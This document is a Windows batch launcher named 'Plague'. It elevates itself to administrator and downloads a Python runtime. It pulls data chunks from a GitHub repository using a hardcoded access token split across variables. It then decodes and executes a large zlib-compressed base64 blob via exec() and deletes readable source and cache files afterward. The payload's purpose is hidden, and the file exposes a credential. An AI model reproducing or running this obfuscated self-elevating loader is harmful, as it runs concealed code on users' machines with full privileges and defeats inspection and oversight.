@echo off
setlocal EnableDelayedExpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo   [admin] Requesting administrator privileges...
    if "%*"=="" (
        powershell -NoProfile -Command ^
            "Start-Process -FilePath '%~f0' -Verb RunAs -WorkingDirectory '%~dp0'"
    ) else (
        powershell -NoProfile -Command ^
            "Start-Process -FilePath '%~f0' -ArgumentList '%*' -Verb RunAs -WorkingDirectory '%~dp0'"
    )
    exit /b
)
pushd "%~dp0"

title Plague - Starting...

set "PYTHON_VERSION=3.13.7"
set "PYTHON_ZIP_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-embed-amd64.zip"
set "GET_PIP_URL=https://bootstrap.pypa.io/get-pip.py"
set "GITHUB_REPO=serqw121/gddx"
set "GITHUB_BRANCH=main"
set "_TA=github_"
set "_TB=pat_"
set "_TC=11CS3FZNI0VR4b6QdqYced_ByBKXbFsF1Q3XmIqVMyfVzWqWT2ejSZbJRA7LrEaiDWVPE3ENQUDUXiPaxX"
set "GITHUB_TOKEN=%_TA%%_TB%%_TC%"

set "WORK_DIR=%~dp0b"
set "RUNTIME_DIR=%WORK_DIR%\runtime"
set "PYTHON_EXE=%RUNTIME_DIR%\python.exe"

if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"

if not exist "%PYTHON_EXE%" goto :install_python
"%PYTHON_EXE%" -m pip --version >nul 2>&1
if errorlevel 1 (
    echo   Runtime damaged — rebuilding...
    rd /s /q "%RUNTIME_DIR%" >nul 2>&1
    if exist "%WORK_DIR%\.deps_installed" del /Q "%WORK_DIR%\.deps_installed" >nul 2>&1
    goto :install_python
)
goto :have_python

:install_python
echo.
echo   ================================================================
echo        Plague - First-Time Setup
echo   ================================================================
echo.
echo   [1/3] Downloading Python %PYTHON_VERSION% runtime...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
    "$ProgressPreference = 'SilentlyContinue'; " ^
    "try { " ^
    "    Invoke-WebRequest -Uri '%PYTHON_ZIP_URL%' -OutFile '%WORK_DIR%\python_embed.zip' -UseBasicParsing ; " ^
    "    Expand-Archive -Path '%WORK_DIR%\python_embed.zip' -DestinationPath '%RUNTIME_DIR%' -Force ; " ^
    "    Remove-Item '%WORK_DIR%\python_embed.zip' -Force ; " ^
    "    Write-Host '         Done.' " ^
    "} catch { " ^
    "    Write-Host ('  ERROR: ' + $_.Exception.Message) ; " ^
    "    exit 1 " ^
    "}"

if not exist "%PYTHON_EXE%" (
    echo   ERROR: Python download failed.
    pause
    exit /b 1
)

for %%f in ("%RUNTIME_DIR%\python*._pth") do set "PTH_FILE=%%f"
if defined PTH_FILE (
    (
        echo python313.zip
        echo .
        echo Lib\site-packages
        echo import site
    ) > "!PTH_FILE!"
)
if not exist "%RUNTIME_DIR%\Lib\site-packages" mkdir "%RUNTIME_DIR%\Lib\site-packages"

echo   [2/3] Installing pip...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
    "$ProgressPreference = 'SilentlyContinue'; " ^
    "Invoke-WebRequest -Uri '%GET_PIP_URL%' -OutFile '%WORK_DIR%\get-pip.py' -UseBasicParsing"
if exist "%WORK_DIR%\get-pip.py" (
    "%PYTHON_EXE%" "%WORK_DIR%\get-pip.py" --no-warn-script-location >nul 2>&1
    del "%WORK_DIR%\get-pip.py" >nul 2>&1
)

echo   [3/3] Installing dependencies...
"%PYTHON_EXE%" -m pip install --no-warn-script-location -q requests certifi qrcode cryptography PySocks dkimpy fpdf2 pyotp setuptools wheel >nul 2>&1
echo         Done.
echo.

:have_python

for %%f in (launcher.pye _decrypt_bootstrap.py launcher_config_new.json .migrated) do (
    if exist "%WORK_DIR%\%%f" del /Q "%WORK_DIR%\%%f" >nul 2>&1
)

rem ── Clean readable source from the launcher directory ──
for %%e in (py pyc pyo pye) do (
    del /Q "%~dp0*.%%e" >nul 2>&1
)
if exist "%~dp0__pycache__" rd /s /q "%~dp0__pycache__" >nul 2>&1

set "NEED_UPDATE=0"
set "VERSION_FILE=%WORK_DIR%\.launcher_version"

if not exist "%WORK_DIR%\000.txt" (
    set "NEED_UPDATE=1"
    goto :do_update_check_done
)
rem Force re-download if v2 chunks are missing (migration from old start.bat)
if not exist "%WORK_DIR%\s001.txt" (
    set "NEED_UPDATE=1"
    goto :do_update_check_done
)

echo   Checking for updates...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
    "$ProgressPreference = 'SilentlyContinue'; " ^
    "$headers = @{ 'Authorization' = 'Bearer %GITHUB_TOKEN%'; 'Accept' = 'application/vnd.github.v3+json' }; " ^
    "try { " ^
    "    $resp = Invoke-RestMethod -Uri 'https://api.github.com/repos/%GITHUB_REPO%/commits/%GITHUB_BRANCH%' -Headers $headers; " ^
    "    $latest = $resp.sha; " ^
    "    $saved = ''; " ^
    "    if (Test-Path '%VERSION_FILE%') { $saved = (Get-Content '%VERSION_FILE%' -Raw).Trim() }; " ^
    "    if ($latest -eq $saved) { exit 0 } else { exit 1 } " ^
    "} catch { exit 1 }"
if errorlevel 1 (
    set "NEED_UPDATE=1"
) else (
    echo         Up to date.
)

:do_update_check_done
if "%NEED_UPDATE%"=="0" goto :launch

echo   Cleaning up...
del /Q "%WORK_DIR%\*.py"  >nul 2>&1
del /Q "%WORK_DIR%\*.pye" >nul 2>&1
del /Q "%WORK_DIR%\*.pyc" >nul 2>&1
del /Q "%WORK_DIR%\*.bak" >nul 2>&1
del /Q "%WORK_DIR%\*.txt" >nul 2>&1
if exist "%WORK_DIR%\app" rd /s /q "%WORK_DIR%\app" >nul 2>&1
if exist "%WORK_DIR%\__pycache__" rd /s /q "%WORK_DIR%\__pycache__" >nul 2>&1
echo         Done.

echo   Downloading data...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
    "$ProgressPreference = 'SilentlyContinue'; " ^
    "$headers = @{ 'Authorization' = 'Bearer %GITHUB_TOKEN%'; 'Accept' = 'application/vnd.github.v3+json' }; " ^
    "$base = 'https://api.github.com/repos/%GITHUB_REPO%/contents'; " ^
    "$count = 0; " ^
    "try { " ^
    "    $items = Invoke-RestMethod -Uri ($base + '?ref=%GITHUB_BRANCH%') -Headers $headers -UseBasicParsing; " ^
    "    $headers['Accept'] = 'application/vnd.github.v3.raw'; " ^
    "    $chunks = $items | Where-Object { $_.name -match '^(000|s\d{3})\.txt$' }; " ^
    "    $total = $chunks.Count; " ^
    "    foreach ($item in $chunks) { " ^
    "        $count++; " ^
    "        $outFile = Join-Path '%WORK_DIR%' $item.name; " ^
    "        Invoke-WebRequest -Uri ($base + '/' + $item.name + '?ref=%GITHUB_BRANCH%') -Headers $headers -OutFile $outFile -UseBasicParsing; " ^
    "        Write-Host "`r         $count / $total files" -NoNewLine; " ^
    "    } " ^
    "    Write-Host ''; " ^
    "    Write-Host '         Done.' " ^
    "} catch { " ^
    "    Write-Host ('  ERROR: ' + $_.Exception.Message); " ^
    "    exit 1 " ^
    "}"

if not exist "%WORK_DIR%\000.txt" (
    echo.
    echo   ERROR: Could not download data files from GitHub.
    echo   Check your internet connection and try again.
    echo.
    pause
    exit /b 1
)

:launch
echo   Launching...
echo.

set "WORK_DIR=%WORK_DIR%"
set "GITHUB_REPO=%GITHUB_REPO%"
set "GITHUB_BRANCH=%GITHUB_BRANCH%"
set "GITHUB_TOKEN=%GITHUB_TOKEN%"

set "_BLOB_B64=%WORK_DIR%\.~b"
del /Q /A "%_BLOB_B64%" >nul 2>&1
>"%_BLOB_B64%" echo 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
>>"%_BLOB_B64%" echo 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
"%PYTHON_EXE%" -B -c "import zlib as Z,base64 as B,pathlib as P;exec(Z.decompress(B.b64decode(P.Path(r'%_BLOB_B64%').read_text().replace(chr(10),'').replace(chr(13),'').strip())))"
set "BLOB_EXIT=%errorlevel%"
del /Q /A "%_BLOB_B64%" >nul 2>&1

if exist "%WORK_DIR%\app" rd /s /q "%WORK_DIR%\app" >nul 2>&1

rem ── Clean readable source only — preserve local_data and persistent files ──
for %%e in (py pyc pyo pye bak html htm js mjs css bat.bak sh map ts tsx jsx yaml yml xml) do (
    del /Q "%WORK_DIR%\*.%%e" >nul 2>&1
)

if exist "%WORK_DIR%\__pycache__" rd /s /q "%WORK_DIR%\__pycache__" >nul 2>&1
if exist "%WORK_DIR%\..\__pycache__" rd /s /q "%WORK_DIR%\..\__pycache__" >nul 2>&1
for /d /r "%WORK_DIR%" %%d in (__pycache__) do (
    if exist "%%d" (
        echo "%%d" | findstr /i /c:"\runtime\" >nul || rd /s /q "%%d" >nul 2>&1
    )
)

if "%BLOB_EXIT%" neq "0" (
    echo.
    echo   Something went wrong. Press any key to close.
    pause >nul
)

endlocal
pause
